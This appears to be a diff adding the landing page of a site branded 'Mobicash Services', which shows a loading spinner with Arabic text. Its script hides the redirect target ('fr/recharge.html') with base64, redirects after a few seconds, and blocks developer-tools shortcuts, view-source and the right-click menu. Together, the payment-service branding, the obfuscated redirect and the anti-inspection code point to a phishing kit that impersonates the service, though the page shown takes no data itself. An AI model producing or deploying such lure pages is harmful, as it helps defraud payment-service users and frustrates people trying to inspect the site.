@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mobicash Services</title>
+  <style>
+    :root {
+      --bg-light: #ffffff;
+      --bg-dark: #0e0e0e;
+      --text-light: #111;
+      --text-dark: #f1f1f1;
+      --ring-color: #00e676;
+      --ring-track: rgba(0, 0, 0, 0.1);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      height: 100vh;
+      background: var(--bg-light);
+      color: var(--text-light);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.3s, color 0.3s;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 25px;
+      letter-spacing: 0.3px;
+    }
+
+    .spinner {
+      width: 32px;
+      height: 32px;
+      border: 1.8px solid var(--ring-track);
+      border-top: 1.8px solid var(--ring-color);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    .loading-text {
+      font-size: 14px;
+      color: #777;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (prefers-color-scheme: dark) {
+      body {
+        background-color: var(--bg-dark);
+        color: var(--text-dark);
+      }
+
+      .spinner {
+        border: 1.8px solid rgba(255, 255, 255, 0.08);
+        border-top-color: #00e676;
+      }
+
+      .loading-text {
+        color: #aaa;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Mobicash Services</h1>
+  <div class="spinner"></div>
+  <p class="loading-text">جار التحميل، يرجى الانتظار...</p>
+
+  <script>
+    const path = atob("ZnIvcmVjaGFyZ2UuaHRtbA==");
+    setTimeout(() => {
+      window.location.href = path;
+    }, 3500);
+
+    document.addEventListener('keydown', function(e) {
+      if (
+        e.key === "F12" ||
+        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+        (e.ctrlKey && e.key === "U")
+      ) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
+    });
+
+    window.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+    });
+  </script>
+</body>
+</html>
